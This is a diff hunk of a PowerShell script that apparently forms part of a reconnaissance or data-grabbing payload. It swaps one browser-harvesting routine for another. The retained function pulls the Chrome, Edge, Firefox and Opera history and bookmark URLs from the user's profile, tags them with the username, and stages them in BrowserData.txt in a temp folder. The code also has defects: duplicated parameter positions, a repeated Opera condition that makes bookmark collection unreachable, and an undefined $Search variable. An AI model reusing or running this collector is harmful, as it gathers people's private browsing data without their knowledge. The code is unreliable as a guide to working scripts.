@@ -440,206 +440,54 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
-# function Get-BrowserData {
-
-#     [CmdletBinding()]
-#     param (	
-#     [Parameter (Position=1,Mandatory = $True)]
-#     [string]$Browser,    
-#     [Parameter (Position=1,Mandatory = $True)]
-#     [string]$DataType 
-#     ) 
-
-#     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-
-#     if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-#     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-#     elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-#     elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-#     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-#     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-#     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
-
-#     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
-#     $Value | ForEach-Object {
-#         $Key = $_
-#         if ($Key -match $Search){
-#             New-Object -TypeName PSObject -Property @{
-#                 User = $env:UserName
-#                 Browser = $Browser
-#                 DataType = $DataType
-#                 Data = $_
-#             }
-#         }
-#     } 
-# }
-
-# Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-# Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
 function Get-BrowserData {
 
     [CmdletBinding()]
-    param (
-        [Parameter(Position=1, Mandatory=$True)]
-        [string]$Browser,
-        
-        [Parameter(Position=2, Mandatory=$True)]
-        [string]$DataType
-    )
+    param (	
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
+    ) 
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    $HistoryQuery = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"
 
-    switch ($Browser) {
-        'chrome' {
-            if ($DataType -eq 'history') { 
-                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-                Get-SQLiteHistoryData -Path $Path -Query $HistoryQuery -Browser $Browser -DataType $DataType
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-                Get-JSONBookmarkData -Path $Path -Browser $Browser -DataType $DataType
-            }
-        }
-        'edge' {
-            if ($DataType -eq 'history') { 
-                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-                Get-SQLiteHistoryData -Path $Path -Query $HistoryQuery -Browser $Browser -DataType $DataType
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-                Get-JSONBookmarkData -Path $Path -Browser $Browser -DataType $DataType
-            }
-        }
-        'firefox' {
-            if ($DataType -eq 'history') {
-                $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-                Get-SQLiteHistoryData -Path $Path -Query $HistoryQuery -Browser $Browser -DataType $DataType
-            }
-        }
-        'opera' {
-            if ($DataType -eq 'history') {
-                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-                Get-SQLiteHistoryData -Path $Path -Query $HistoryQuery -Browser $Browser -DataType $DataType
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
-                Get-JSONBookmarkData -Path $Path -Browser $Browser -DataType $DataType
-            }
-        }
-        default {
-            Write-Error "Unsupported browser or datatype"
-        }
-    }
-}
+    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
+    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
 
-function Get-SQLiteHistoryData {
-    param (
-        [string]$Path,
-        [string]$Query,
-        [string]$Browser,
-        [string]$DataType
-    )
-
-    Write-Host "Processing history data for $Browser..."
-
-    # Load SQLite .NET Assembly
-    Add-Type -AssemblyName "System.Data.SQLite"
-
-    # Open SQLite Connection
-    $Connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$Path;Version=3;Read Only=True;")
-    $Connection.Open()
-    
-    $Command = $Connection.CreateCommand()
-    $Command.CommandText = $Query
-
-    try {
-        $Reader = $Command.ExecuteReader()
-        $HistoryFound = $false
-
-        # Process each row
-        while ($Reader.Read()) {
-            $Url = $Reader["url"]
-            $Title = $Reader["title"]
-            $VisitCount = $Reader["visit_count"]
-            $LastVisitTime = [System.DateTime]::FromFileTimeUtc(($Reader["last_visit_time"] * 10) + 116444736000000000)
-            
-            # Output data
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
             New-Object -TypeName PSObject -Property @{
                 User = $env:UserName
                 Browser = $Browser
                 DataType = $DataType
-                URL = $Url
-                Title = $Title
-                VisitCount = $VisitCount
-                LastVisitTime = $LastVisitTime
-            }
-
-            $HistoryFound = $true
-        }
-
-        if (-not $HistoryFound) {
-            Write-Host "No history data found for $Browser."
-        }
-
-    } catch {
-        Write-Host "Failed to query history data: $_"
-    } finally {
-        # Close the connection
-        $Connection.Close()
-    }
-}
-
-function Get-JSONBookmarkData {
-    param (
-        [string]$Path,
-        [string]$Browser,
-        [string]$DataType
-    )
-
-    Write-Host "Processing bookmark data for $Browser..."
-
-    # Load the JSON file
-    $JsonData = Get-Content -Path $Path -Raw | ConvertFrom-Json
-
-    # Traverse and extract bookmarks (structure depends on browser)
-    $Bookmarks = $JsonData.roots.bookmark_bar.children
-
-    foreach ($Bookmark in $Bookmarks) {
-        if ($Bookmark.type -eq 'url') {
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Name = $Bookmark.name
-                URL = $Bookmark.url
+                Data = $_
             }
         }
-    }
+    } 
 }
-
-# Example usage
-# New-Item -Path $env:TMP\$FolderName -ItemType Directory -Force
 
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
 
 ############################################################################################################################################################
 
